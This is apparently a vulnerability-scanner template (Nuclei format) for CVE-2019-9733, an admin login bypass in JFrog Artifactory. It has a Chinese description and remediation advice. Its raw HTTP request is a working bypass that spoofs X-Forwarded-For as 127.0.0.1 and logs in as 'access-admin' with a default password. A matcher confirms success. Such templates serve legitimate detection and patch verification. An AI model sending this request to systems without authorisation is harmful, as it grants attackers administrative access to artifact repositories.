id: CVE-2019-9733
info:
  name: JFrog Artifactory 6.7.3 - Admin Login Bypass
  author:
  - l0ne1y
  description: |-
    JFrog Artifactory 认证绕过漏洞
    JFrog Artifactory是以色列JFrog公司的一款开源的通用Artifact存储库管理器，它支持集群和高可用性Docker注册表，并提供端到端的用于跟踪从开发到生产的工件自动化解决方案。

    JFrog Artifactory 6.8.7之前版本中存在访问控制错误漏洞。该漏洞源于网络系统或产品未正确限制来自未授权角色的资源访问。
  severity: critical
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://jfrog.com/

    临时修复方案：
    1、前后端同时对用户输入信息进行校验，双重验证机制。
    2、调用功能前验证用户是否有权限调用相关功能。
requests:
- matchers:
  - type: word
    part: body
    words:
    - '"username": "access-admin"'
  - type: status
    status:
    - 200
  matchers-condition: and
  raw:
  - |
    POST /artifactory/ui/auth/login?_spring_security_remember_me=false HTTP/1.1
    Host: {{Hostname}}
    Accept: application/json, text/plain, */*
    X-Requested-With: artUI
    X-Forwarded-For: 127.0.0.1
    Request-Agent: artifactoryUI
    Content-Type: application/json
    Origin: {{BaseURL}}
    Referer: {{BaseURL}}/artifactory/webapp/

    {"user":"access-admin","password":"password","type":"login"}
